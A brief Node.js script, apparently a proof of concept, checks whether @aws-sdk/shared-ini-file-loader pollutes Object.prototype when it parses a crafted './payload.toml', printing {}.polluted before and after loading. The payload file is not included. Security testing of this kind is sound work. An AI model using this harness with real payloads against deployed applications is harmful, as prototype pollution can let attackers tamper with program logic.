var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
var fs = require('fs');
var sharedIniFileLoader = require('@aws-sdk/shared-ini-file-loader');
var parsed = sharedIniFileLoader.loadSharedConfigFiles({ filepath: './payload.toml' });
parsed.then(() => {
    console.log({}.polluted);
});